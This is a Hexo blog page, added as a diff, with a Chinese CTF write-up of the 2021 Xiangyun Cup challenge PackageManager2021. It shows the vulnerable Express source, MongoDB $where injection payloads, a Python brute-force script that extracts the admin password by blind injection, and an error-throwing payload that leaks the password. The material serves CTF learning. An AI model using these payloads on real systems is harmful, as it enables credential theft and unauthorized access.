@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="odiws">
+
+
+
+
+
+<title>[2021祥云杯]PackageManager2021 | Hexo</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Bentham&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Bentham&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">[2021祥云杯]PackageManager2021</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">odiws</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">November 4, 2024&nbsp;&nbsp;19:29:50</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/">刷题笔记</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h2 id="2021祥云杯-PackageManager2021"><a href="#2021祥云杯-PackageManager2021" class="headerlink" title="[2021祥云杯]PackageManager2021"></a>[2021祥云杯]PackageManager2021</h2><p>index.ts的源码：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> *  <span class="keyword">as</span> express <span class="keyword">from</span> <span class="string">&quot;express&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">User</span> &#125; <span class="keyword">from</span> <span class="string">&quot;../schema&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; checkmd5Regex &#125; <span class="keyword">from</span> <span class="string">&quot;../utils&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">_, res</span>) =&gt;</span> res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="function">(<span class="params">_, res</span>) =&gt;</span> res.<span class="title function_">render</span>(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">	<span class="keyword">let</span> &#123; username, password &#125; = req.<span class="property">body</span>;</span><br><span class="line">	<span class="keyword">if</span> (username &amp;&amp; password) &#123;</span><br><span class="line">		<span class="keyword">if</span> (username == <span class="string">&#x27;&#x27;</span> || <span class="keyword">typeof</span> (username) !== <span class="string">&quot;string&quot;</span> || password == <span class="string">&#x27;&#x27;</span> || <span class="keyword">typeof</span> (password) !== <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">			<span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;login&#x27;</span>, &#123; <span class="attr">error</span>: <span class="string">&#x27;Parameters error&#x27;</span> &#125;);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">const</span> user = <span class="keyword">await</span> <span class="title class_">User</span>.<span class="title function_">findOne</span>(&#123; <span class="string">&quot;username&quot;</span>: username &#125;)</span><br><span class="line">		<span class="keyword">if</span> (!user || !(user.<span class="property">password</span> === password)) &#123;</span><br><span class="line">			<span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;login&#x27;</span>, &#123; <span class="attr">error</span>: <span class="string">&#x27;Invalid username or password&#x27;</span> &#125;);</span><br><span class="line">		&#125;</span><br><span class="line">		req.<span class="property">session</span>.<span class="property">userId</span> = user.<span class="property">id</span></span><br><span class="line">		res.<span class="title function_">redirect</span>(<span class="string">&#x27;/packages/list&#x27;</span>)</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;login&#x27;</span>, &#123; <span class="attr">error</span>: <span class="string">&#x27;Parameters cannot be blank&#x27;</span> &#125;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/register&#x27;</span>, <span class="function">(<span class="params">_, res</span>) =&gt;</span> res.<span class="title function_">render</span>(<span class="string">&#x27;register&#x27;</span>))</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/register&#x27;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">	<span class="keyword">let</span> &#123; username, password, password2 &#125; = req.<span class="property">body</span>;</span><br><span class="line">	<span class="keyword">if</span> (username &amp;&amp; password &amp;&amp; password2) &#123;</span><br><span class="line">		<span class="keyword">if</span> (username == <span class="string">&#x27;&#x27;</span> || <span class="keyword">typeof</span> (username) !== <span class="string">&quot;string&quot;</span> || password == <span class="string">&#x27;&#x27;</span> || <span class="keyword">typeof</span> (password) !== <span class="string">&quot;string&quot;</span> || password2 == <span class="string">&#x27;&#x27;</span> || <span class="keyword">typeof</span> (password2) !== <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">			<span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;register&#x27;</span>, &#123; <span class="attr">error</span>: <span class="string">&#x27;Parameters error&#x27;</span> &#125;);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (password != password2) &#123;</span><br><span class="line">			<span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;register&#x27;</span>, &#123; <span class="attr">error</span>: <span class="string">&#x27;Password do noy match&#x27;</span> &#125;);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">await</span> <span class="title class_">User</span>.<span class="title function_">findOne</span>(&#123; <span class="attr">username</span>: username &#125;)) &#123;</span><br><span class="line">			<span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;register&#x27;</span>, &#123; <span class="attr">error</span>: <span class="string">&#x27;Username already taken&#x27;</span> &#125;);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			<span class="keyword">const</span> user = <span class="keyword">new</span> <span class="title class_">User</span>(&#123; <span class="string">&quot;username&quot;</span>: username, <span class="string">&quot;password&quot;</span>: password, <span class="string">&quot;isAdmin&quot;</span>: <span class="literal">false</span> &#125;)</span><br><span class="line">			<span class="keyword">await</span> user.<span class="title function_">save</span>()</span><br><span class="line">		&#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">			<span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;register&#x27;</span>, &#123; <span class="attr">error</span>: err &#125;);</span><br><span class="line">		&#125;</span><br><span class="line">		res.<span class="title function_">redirect</span>(<span class="string">&#x27;/login&#x27;</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;register&#x27;</span>, &#123; <span class="attr">error</span>: <span class="string">&#x27;Parameters cannot be blank&#x27;</span> &#125;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/logout&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">	req.<span class="property">session</span>.<span class="title function_">destroy</span>(<span class="function">() =&gt;</span> res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>))</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/auth&#x27;</span>, <span class="function">(<span class="params">_, res</span>) =&gt;</span> res.<span class="title function_">render</span>(<span class="string">&#x27;auth&#x27;</span>))</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/auth&#x27;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">	<span class="keyword">let</span> &#123; token &#125; = req.<span class="property">body</span>;</span><br><span class="line">	<span class="keyword">if</span> (token !== <span class="string">&#x27;&#x27;</span> &amp;&amp; <span class="keyword">typeof</span> (token) === <span class="string">&#x27;string&#x27;</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_">checkmd5Regex</span>(token)) &#123;</span><br><span class="line">			<span class="keyword">try</span> &#123;</span><br><span class="line">				<span class="keyword">let</span> docs = <span class="keyword">await</span> <span class="title class_">User</span>.$where(<span class="string">`this.username == &quot;admin&quot; &amp;&amp; hex_md5(this.password) == &quot;<span class="subst">$&#123;token.toString()&#125;</span>&quot;`</span>).<span class="title function_">exec</span>()</span><br><span class="line">				<span class="variable language_">console</span>.<span class="title function_">log</span>(docs);</span><br><span class="line">				<span class="keyword">if</span> (docs.<span class="property">length</span> == <span class="number">1</span>) &#123;</span><br><span class="line">					<span class="keyword">if</span> (!(docs[<span class="number">0</span>].<span class="property">isAdmin</span> === <span class="literal">true</span>)) &#123;</span><br><span class="line">						<span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;auth&#x27;</span>, &#123; <span class="attr">error</span>: <span class="string">&#x27;Failed to auth&#x27;</span> &#125;)</span><br><span class="line">					&#125;</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					<span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;auth&#x27;</span>, &#123; <span class="attr">error</span>: <span class="string">&#x27;No matching results&#x27;</span> &#125;)</span><br><span class="line">				&#125;</span><br><span class="line">			&#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">				<span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;auth&#x27;</span>, &#123; <span class="attr">error</span>: err &#125;)</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;auth&#x27;</span>, &#123; <span class="attr">error</span>: <span class="string">&#x27;Token must be valid md5 string&#x27;</span> &#125;)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;auth&#x27;</span>, &#123; <span class="attr">error</span>: <span class="string">&#x27;Parameters error&#x27;</span> &#125;)</span><br><span class="line">	&#125;</span><br><span class="line">	req.<span class="property">session</span>.<span class="property">AccessGranted</span> = <span class="literal">true</span></span><br><span class="line">	res.<span class="title function_">redirect</span>(<span class="string">&#x27;/packages/submit&#x27;</span>)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> router;</span><br></pre></td></tr></table></figure>
+
+<p>主页注册登陆后：</p>
+<p><img src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202411041945021.png" alt="image-20241104194519814"></p>
+<p>发现这些东西全被过滤了，那应该就是不是上传js文件submit东西执行js文件获取文件了，那应该就是拿admin的密码登录了，找一下源码关于admin的信息，找到这个源码：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/auth&#x27;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">	<span class="keyword">let</span> &#123; token &#125; = req.<span class="property">body</span>;</span><br><span class="line">	<span class="keyword">if</span> (token !== <span class="string">&#x27;&#x27;</span> &amp;&amp; <span class="keyword">typeof</span> (token) === <span class="string">&#x27;string&#x27;</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_">checkmd5Regex</span>(token)) &#123;</span><br><span class="line">			<span class="keyword">try</span> &#123;</span><br><span class="line">				<span class="keyword">let</span> docs = <span class="keyword">await</span> <span class="title class_">User</span>.$where(<span class="string">`this.username == &quot;admin&quot; &amp;&amp; hex_md5(this.password) == &quot;<span class="subst">$&#123;token.toString()&#125;</span>&quot;`</span>).<span class="title function_">exec</span>()</span><br><span class="line">				<span class="variable language_">console</span>.<span class="title function_">log</span>(docs);</span><br><span class="line">				<span class="keyword">if</span> (docs.<span class="property">length</span> == <span class="number">1</span>) &#123;</span><br><span class="line">					<span class="keyword">if</span> (!(docs[<span class="number">0</span>].<span class="property">isAdmin</span> === <span class="literal">true</span>)) &#123;</span><br><span class="line">						<span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;auth&#x27;</span>, &#123; <span class="attr">error</span>: <span class="string">&#x27;Failed to auth&#x27;</span> &#125;)</span><br><span class="line">					&#125;</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					<span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;auth&#x27;</span>, &#123; <span class="attr">error</span>: <span class="string">&#x27;No matching results&#x27;</span> &#125;)</span><br><span class="line">				&#125;</span><br><span class="line">			&#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">				<span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;auth&#x27;</span>, &#123; <span class="attr">error</span>: err &#125;)</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;auth&#x27;</span>, &#123; <span class="attr">error</span>: <span class="string">&#x27;Token must be valid md5 string&#x27;</span> &#125;)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;auth&#x27;</span>, &#123; <span class="attr">error</span>: <span class="string">&#x27;Parameters error&#x27;</span> &#125;)</span><br><span class="line">	&#125;</span><br><span class="line">	req.<span class="property">session</span>.<span class="property">AccessGranted</span> = <span class="literal">true</span></span><br><span class="line">	res.<span class="title function_">redirect</span>(<span class="string">&#x27;/packages/submit&#x27;</span>)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>其中：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> docs = <span class="keyword">await</span> <span class="title class_">User</span>.$where(<span class="string">`this.username == &quot;admin&quot; &amp;&amp; hex_md5(this.password) == &quot;<span class="subst">$&#123;token.toString()&#125;</span>&quot;`</span>).<span class="title function_">exec</span>()</span><br><span class="line">				<span class="variable language_">console</span>.<span class="title function_">log</span>(docs);</span><br></pre></td></tr></table></figure>
+
+<p>这个token我们可以控制，并且还有exec执行函数，可以构造随便md5“加上||this.password[0]&#x3D;&#x3D;”a 进行布尔盲注</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot; || this.password[0]==&quot;a&quot;</span><br></pre></td></tr></table></figure>
+
+<p>此时：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">this</span>.<span class="property">username</span> == <span class="string">&quot;admin&quot;</span> &amp;&amp; <span class="title function_">hex_md5</span>(<span class="variable language_">this</span>.<span class="property">password</span>) == <span class="string">&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;</span> || <span class="variable language_">this</span>.<span class="property">password</span>[<span class="number">0</span>]==<span class="string">&quot;a&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>基本上就是||后面的对了就是对的，错了就是错的，就可以爆密码了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://33384f3e-07da-423c-a59f-2b1d078b0e5e.node5.buuoj.cn:81/auth&quot;</span></span><br><span class="line">headers=&#123;</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;session=s%3A3wvQHv9Y0mXpJiI6waZgpyDAJEUZx1xo.JVohWm50pSeTB1xXjWBypCPrJjkGoxsdEJ4MukmieVQ&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> string.printable:</span><br><span class="line">        <span class="keyword">if</span> j == <span class="string">&#x27;&quot;&#x27;</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        payload=<span class="string">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;||this.password[&#123;&#125;]==&quot;&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(i,j)</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&quot;_csrf&quot;</span>: <span class="string">&quot;90fXyUpP-Ozj7FRw1cLILI9yNJds_QbJM5Bk&quot;</span>,</span><br><span class="line">            <span class="string">&quot;token&quot;</span>: payload</span><br><span class="line">        &#125;</span><br><span class="line">        r=requests.post(url=url,data=data,headers=headers,allow_redirects=<span class="literal">False</span>)</span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Found. Redirecting to&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(payload)</span><br><span class="line">            flag+=j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202411041959809.png" alt="image-20241104195939735"></p>
+<p>登陆就出了</p>
+<p><img src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202411042000740.png" alt="image-20241104200009587"></p>
+<p>还有就是</p>
+<h4 id="用js语句throw-error"><a href="#用js语句throw-error" class="headerlink" title="用js语句throw error"></a>用js语句throw error</h4><p>js直接报错出的</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">token=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<span class="string">&quot;||(()=&gt;&#123;throw Error(this.password)&#125;)()==&quot;</span>admin</span><br></pre></td></tr></table></figure>
+
+<p>逻辑判断语句为：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">`this.username == &quot;admin&quot; &amp;&amp; hex_md5(this.password) == &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;||(()=&gt;&#123;throw Error(this.password)&#125;)()!=&quot;aaaaa&quot;`</span></span><br></pre></td></tr></table></figure>
+
+<p>这里就是立即执行throw Error(this.password)，后面是!&#x3D;还是&#x3D;&#x3D; 字符串的值是什么都无所谓，只要是语法没问题然后语句正常执行，这里强制抛出异常，从源码中可以看到抛出的异常会被渲染出来，然后就能够看到password的值</p>
+<p><img src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202411042001767.png" alt="image-20241104200138677"></p>
+<p>也是直接出密码</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>odiws</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://odiws.github.io/2024/11/04/2021%E7%A5%A5%E4%BA%91%E6%9D%AF-PackageManager2021/">http://odiws.github.io/2024/11/04/2021%E7%A5%A5%E4%BA%91%E6%9D%AF-PackageManager2021/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/buuctf/"># buuctf</a>
+                    
+                        <a href="/tags/mongodb%E6%B3%A8%E5%85%A5/"># mongodb注入</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2024/11/04/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020-Roamphp2-Myblog/">[极客大挑战2020]Roamphp2-Myblog</a>
+            
+            
+            <a class="next" rel="next" href="/2024/11/03/CISCN2021Quals-upload/">[CISCN2021Quals]upload</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© odiws | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
